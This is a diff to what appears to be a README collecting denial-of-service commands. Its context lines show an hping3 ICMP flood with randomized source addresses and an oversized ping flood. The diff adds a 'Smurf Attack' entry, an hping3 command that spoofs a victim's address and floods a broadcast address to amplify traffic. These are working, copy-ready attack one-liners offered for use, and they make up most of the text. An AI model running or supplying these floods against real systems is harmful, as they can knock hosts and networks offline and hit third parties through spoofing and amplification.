@@ -86,6 +86,10 @@ sudo hping3 --icmp --rand-source <target IP> --flood
 ```
 sudo ping -f -s 65500 <Target IP>
 ```
++ ### Smurf Attack
+```
+sudo hping3 -1 --flood -a <Victim IP> <Broadcast IP>
+```
 ## Other contributors
 * [Chaitanya kumar](https://github.com/Jackson2398)
 * [Aditya Choudary](https://github.com/adityachd123)
